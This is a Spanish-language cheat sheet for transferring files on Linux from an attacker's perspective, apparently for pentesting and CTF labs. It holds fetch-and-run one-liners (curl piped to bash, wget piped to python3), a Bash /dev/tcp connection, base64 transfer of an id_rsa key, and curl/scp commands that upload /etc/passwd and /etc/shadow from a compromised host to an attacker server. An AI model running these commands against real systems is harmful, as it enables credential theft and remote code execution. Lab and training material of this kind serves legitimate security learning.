# Transferencia de Archivos en Linux

Linux es un sistema operativo versátil que incluye muchas herramientas para transferencia de archivos. La mayoría del malware en Linux usa HTTP/HTTPS para comunicarse con su C2, lo que hace que estos métodos sean tanto los más comunes como los más monitorizados.

### Descargas

#### Base64

Para transferencias sin red o cuando los canales HTTP están bloqueados.

```bash
# Calcular hash y codificar
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# Decodificar en el destino
echo -n 'LS0tLS1CRUdJ...' | base64 -d > id_rsa

# Verificar integridad
md5sum id_rsa
```

#### wget y cURL

Las dos herramientas más comunes en distribuciones Linux.

```bash
# wget
wget https://servidor/LinEnum.sh -O /tmp/LinEnum.sh

# cURL
curl -o /tmp/LinEnum.sh https://servidor/LinEnum.sh

# Fileless con cURL — ejecutar sin tocar disco
curl https://servidor/LinEnum.sh | bash

# Fileless con wget
wget -qO- https://servidor/script.py | python3
```

#### Bash /dev/tcp

Cuando no hay `wget`, `curl` ni Python disponibles. Funciona con Bash 2.04+ compilado con `--enable-net-redirections`.

```bash
# Conectar al servidor web
exec 3<>/dev/tcp/10.10.10.10/80

# Enviar petición GET
echo -e "GET /archivo.sh HTTP/1.1\n\n" >&3

# Leer la respuesta
cat <&3
```

#### SSH / SCP

Cuando hay acceso SSH al servidor atacante.

```bash
# Habilitar SSH en el servidor atacante
sudo systemctl enable ssh && sudo systemctl start ssh

# Descargar archivo desde el servidor atacante
scp usuario@192.168.1.100:/root/herramienta.sh .

# Verificar que el puerto está en escucha
netstat -lnpt | grep 22
```

### Subidas

#### Upload HTTP con servidor Python

```bash
# En el servidor atacante — instalar y levantar uploadserver con HTTPS
pip3 install uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Desde el sistema comprometido — subir archivos
curl -X POST https://192.168.1.100/upload \
    -F 'files=@/etc/passwd' \
    -F 'files=@/etc/shadow' \
    --insecure
```

#### Servidores web rápidos para servir archivos

Cuando se controla el sistema Linux comprometido y se quiere que el atacante descargue desde él.

```bash
# Python 3
python3 -m http.server 8080

# Python 2.7
python2.7 -m SimpleHTTPServer 8080

# PHP
php -S 0.0.0.0:8080

# Ruby
ruby -run -ehttpd . -p 8080
```

```bash
# El atacante descarga el archivo expuesto
wget http://192.168.1.50:8080/archivo.txt
```

#### SCP Upload

```bash
# Subir un archivo al servidor atacante
scp /etc/passwd usuario@192.168.1.100:/home/usuario/
```

### Referencia rápida

| Método                   | Requiere   | Fileless |
| ------------------------ | ---------- | -------- |
| `curl \| bash`           | curl       | Sí       |
| `wget -qO- \| python3`   | wget       | Sí       |
| `/dev/tcp`               | Solo bash  | No       |
| `scp`                    | SSH activo | No       |
| `python3 -m http.server` | Python     | No       |
| Base64                   | bash       | No       |

> Para CTFs y labs, `python3 -m http.server` en el directorio donde están las herramientas y `wget` desde el objetivo es el flujo más rápido y fiable.

> Al levantar un servidor web en el sistema comprometido para que el atacante descargue archivos, recordar que el tráfico **entrante** al sistema comprometido puede estar bloqueado aunque el saliente no.
